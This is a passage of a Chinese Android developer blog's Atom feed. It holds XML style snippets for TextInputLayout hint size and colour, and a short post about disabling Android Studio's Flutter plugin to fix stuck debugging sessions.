name=&quot;boxStrokeColor&quot;&gt;@color/textinput_box_stroke_color_selector_gray&lt;/item&gt;</span><br><span class="line">&lt;!--&amp;lt;!&amp;ndash;        &lt;item name=&quot;boxBackgroundColor&quot;&gt;@color/green&lt;/item&gt;&amp;ndash;&amp;gt; 在edittext背景没设置的时候有效果--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;item name=&quot;android:textColorHint&quot;&gt;@color/black&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style name=&quot;hintTextAppearance&quot; parent=&quot;@style/TextAppearance.MaterialComponents.Subtitle1&quot;&gt;</span><br><span class="line">    &lt;item name=&quot;android:textSize&quot;&gt;@dimen/app_edit_textsize&lt;/item&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/24ffc89345f3&quot;&gt;修改textinputlayouthiit字体大小&lt;/a&gt;&lt;br&gt;文章字数：21,阅读全文大约需要1分钟&lt;/p&gt;
&lt;figure class=&quot;highlight p
      
    
    </summary>
    
      <category term="android" scheme="https://lozn.top/categories/android/"/>
    
    
      <category term="android" scheme="https://lozn.top/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>androidstudio慎用flutter插件影响正常开发的调试操作</title>
    <link href="https://lozn.top/2021/12/02/android-studio%E6%85%8E%E7%94%A8flutter%E6%8F%92%E4%BB%B6%E5%BD%B1%E5%93%8D%E6%AD%A3%E5%B8%B8%E5%BC%80%E5%8F%91%E7%9A%84%E8%B0%83%E8%AF%95%E6%93%8D%E4%BD%9C/"/>
    <id>https://lozn.top/2021/12/02/android-studio慎用flutter插件影响正常开发的调试操作/</id>
    <published>2021-12-02T03:17:37.000Z</published>
    <updated>2022-06-30T02:06:23.251Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/d16dee00f4b5">androidstudio慎用flutter插件影响正常开发的调试操作</a><br>文章字数：52,阅读全文大约需要1分钟<br>我发现调试后无法触发，app杀死后都无法断开调试，一直处于连接状态，并提示waiting for process detach<br>最后我干脆把插件禁用了，ok,开发调试又香了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/d16dee00f4b5&quot;&gt;androidstudio慎用flutter插件影响正常开发的调试操作&lt;/a&gt;&lt;br&gt;文章字数：52,阅读全文大约需要1分钟&lt;br&gt;我发现调试后无法触发，app杀死后
      
    
    </summary>
    
      <category term="android" scheme="https://lozn.top/categories/android/"/>
    
    
      <category term="android" scheme="https://lozn.top/tags/android/"/>
    
  </entry>
  
</feed>
